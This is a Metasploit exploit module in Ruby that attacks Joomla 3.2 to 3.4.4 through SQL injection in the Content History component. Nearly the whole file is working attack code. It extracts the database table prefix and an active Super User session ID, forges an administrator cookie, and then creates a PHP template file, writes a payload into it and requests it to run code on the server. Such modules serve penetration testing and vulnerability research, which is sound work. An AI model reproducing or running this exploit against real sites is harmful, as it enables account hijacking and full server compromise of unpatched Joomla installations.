##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla Content History SQLi Remote Code Execution",
      'Description'    => %q{
        This module exploits a SQL injection vulnerability found in Joomla versions
        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator
        component in the core of Joomla. Triggering the SQL injection makes it possible
        to retrieve active Super User sessions. The cookie can be used to login to the
        Joomla administrator backend. By creating a new template file containing our
        payload, remote code execution is made possible.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Asaf Orpani', # Vulnerability discovery
          'xistence <xistence[at]0x90.nl>' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2015-7857' ], # Admin session hijacking
          [ 'CVE', '2015-7297' ], # SQLi
          [ 'CVE', '2015-7857' ], # SQLi
          [ 'CVE', '2015-7858' ], # SQLi
          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/' ],
          [ 'URL', 'http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html' ]
        ],
      'Payload'        =>
        {
          'DisableNops' => true,
          # Arbitrary big number. The payload gets sent as POST data, so
          # really it's unlimited
          'Space'       => 262144, # 256k
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla 3.x <= 3.4.4', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct 23 2015",
      'DefaultTarget'  => 0))
 
      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Joomla', '/'])
        ], self.class)
 
  end
 
  def check
 
    # Request using a non-existing table
    res = sqli(rand_text_alphanumeric(rand(10)+6))
 
    if res && res.body =~ /`(.*)_ucm_history`/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
 
  end
 
 
  def sqli( tableprefix )
 
    # SQLi will only grab Super User sessions with a valid username and userid (else they are not logged in).
    # The extra search for NOT LIKE '%IS NOT NULL%' is because of our SQL data that's inserted in the session cookie history.
    # This way we make sure that's excluded and we only get real admin sessions.
 
    sql = " (select 1 FROM(select count(*),concat((select (select concat(session_id)) FROM #{tableprefix}session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)"
 
    # Retrieve cookies
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "index.php"),
      'vars_get' => {
        'option' => 'com_contenthistory',
        'view' => 'history',
        'list[ordering]' => '',
        'item_id' => '1',
        'type_id' => '1',
        'list[select]' => sql
        }
      })
 
    return res
 
  end
 
 
  def exploit
 
    # Request using a non-existing table first, to retrieve the table prefix
    res = sqli(rand_text_alphanumeric(rand(10)+6))
 
    if res && res.code == 500 && res.body =~ /`(.*)_ucm_history`/
      table_prefix = $1
      print_status("#{peer} - Retrieved table prefix [ #{table_prefix} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Error retrieving table prefix")
    end
 
    # Retrieve the admin session using our retrieved table prefix
    res = sqli("#{table_prefix}_")
 
    if res && res.code == 500 && res.body =~ /Duplicate entry &#039;([a-z0-9]+)&#039; for key/
      auth_cookie_part = $1[0...-1]
      print_status("#{peer} - Retrieved admin cookie [ #{auth_cookie_part} ]")
    else
      fail_with(Failure::Unknown, "#{peer}: No logged-in admin user found!")
    end
 
    # Retrieve cookies
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php")
    })
 
    if res && res.code == 200 && res.get_cookies =~ /^([a-z0-9]+)=[a-z0-9]+;/
      cookie_begin = $1
      print_status("#{peer} - Retrieved unauthenticated cookie [ #{cookie_begin} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Error retrieving unauthenticated cookie")
    end
 
    # Modify cookie to authenticated admin
    auth_cookie = cookie_begin
    auth_cookie << "="
    auth_cookie << auth_cookie_part
    auth_cookie << ";"
 
    # Authenticated session
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => auth_cookie
      })
 
    if res && res.code == 200 && res.body =~ /Administration - Control Panel/
      print_status("#{peer} - Successfully authenticated as Administrator")
    else
      fail_with(Failure::Unknown, "#{peer} - Session failure")
    end
 
 
    # Retrieve template view
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => auth_cookie,
      'vars_get' => {
        'option' => 'com_templates',
        'view' => 'templates'
        }
      })
 
    # We try to retrieve and store the first template found
    if res && res.code == 200 && res.body =~ /\/administrator\/index.php\?option=com_templates&view=template&id=([0-9]+)&file=([a-zA-Z0-9=]+)/
      template_id = $1
      file_id = $2
    else
      fail_with(Failure::Unknown, "Unable to retrieve template")
    end
 
    filename = rand_text_alphanumeric(rand(10)+6)
 
    # Create file
    print_status("#{peer} - Creating file [ #{filename}.php ]")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => auth_cookie,
      'vars_get' => {
        'option' => 'com_templates',
        'task' => 'template.createFile',
        'id' => template_id,
        'file' => file_id,
        },
      'vars_post' => {
        'type' => 'php',
        'name' => filename
      }
      })
 
    # Grab token
    if res && res.code == 303 && res.headers['Location']
      location = res.headers['Location']
      print_status("#{peer} - Following redirect to [ #{location} ]")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => auth_cookie
      )
 
      # Retrieving template token
      if res && res.code == 200 && res.body =~ /&([a-z0-9]+)=1\">/
        token = $1
        print_status("#{peer} - Token [ #{token} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Retrieving token failed")
      end
 
      if res && res.code == 200 && res.body =~ /(\/templates\/.*\/)template_preview.png/
        template_path = $1
        print_status("#{peer} - Template path [ #{template_path} ] retrieved")
      else
        fail_with(Failure::Unknown, "#{peer} - Unable to retrieve template path")
      end
 
    else
      fail_with(Failure::Unknown, "#{peer} - Creating file failed")
    end
 
    filename_base64 = Rex::Text.encode_base64("/#{filename}.php")
 
    # Inject payload data into file
    print_status("#{peer} - Insert payload into file [ #{filename}.php ]")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, "administrator", "index.php"),
      'cookie'  => auth_cookie,
      'vars_get' => {
        'option' => 'com_templates',
        'view' => 'template',
        'id' => template_id,
        'file' => filename_base64,
        },
      'vars_post' => {
        'jform[source]' => payload.encoded,
        'task' => 'template.apply',
        token => '1',
        'jform[extension_id]' => template_id,
        'jform[filename]' => "/#{filename}.php"
      }
      })
 
    if res && res.code == 303 && res.headers['Location'] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/
      print_status("#{peer} - Payload data inserted into [ #{filename}.php ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not insert payload into file [ #{filename}.php ]")
    end
 
    # Request payload
    register_files_for_cleanup("#{filename}.php")
    print_status("#{peer} - Executing payload")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path, template_path, "#{filename}.php"),
      'cookie'  => auth_cookie
    })
 
  end
 
end
